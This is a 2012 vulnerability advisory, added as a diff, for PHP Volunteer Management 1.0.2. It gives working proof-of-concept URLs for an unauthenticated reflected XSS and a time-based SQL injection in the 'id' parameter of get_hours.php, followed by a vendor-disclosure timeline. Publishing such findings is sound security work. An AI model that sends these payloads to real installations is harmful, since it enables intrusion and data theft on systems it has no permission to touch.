@@ -1,0 +1,56 @@
+# Exploit Title: PHP Volunteer Management 'id' 1.0.2 Multiple Vulnerabilities
+# Date: 04/21/12
+# Author: G13
+# Twitter: @g13net
+# Software Site: https://sourceforge.net/projects/phpvolunteer/
+# Version: 1.0.2
+# Category: webapp (php)
+#
+
+##### ToC #####
+
+0x01 Description
+0x02 XSS
+0x03 SQL Injection
+0x04 Vendor Notification
+
+##### 0x01 Description #####
+
+This is a PHP Volunteer Management software. Keep track of Volunteer
+hours worked and location assignments. This system is built on
+PHP/MySql.
+
+##### 0x02 XSS #####
+
+---------------Vulnerability-------------------
+
+The 'id' parameter on the get_hours.php page is vulnerable to XSS.  No
+authentication is needed.  This is a reflective XSS vulnerability.
+
+----------Exploit-----------------------------------
+
+http://localhost/mods/hours/data/get_hours.php?id=[XSS]&take=10&skip=0&page=1&pageSize=10
+
+------------PoC---------------------------
+
+http://localhost/mods/hours/data/get_hours.php?id=%27%22%3Cscript%3Ealert%281%29;%3C/script%3E&take=10&skip=0&page=1&pageSize=10
+
+##### 0x03 SQL Injection #####
+
+---------------Vulnerability-------------------
+
+The 'id' parameter on the get_hours.php page is also vulnerable to SQL
+Injection.  No authentication is needed.
+
+----------Exploit-----------------------------------
+
+http://localhost/mods/hours/data/get_hours.php?id=[SQLi]&take=10&skip=0&page=1&pageSize=10
+
+------------PoC---------------------------
+
+http://localhost/mods/hours/data/get_hours.php?id=1%27%20AND%20SLEEP%285%29%20AND%20%27BDzu%27=%27BDzu&take=10&skip=0&page=1&pageSize=10
+
+##### 0x04 Vendor Notification #####
+
+4/21/12 - Vendor Notified
+4/24/12 - Vendor reponded, OK to Disclose
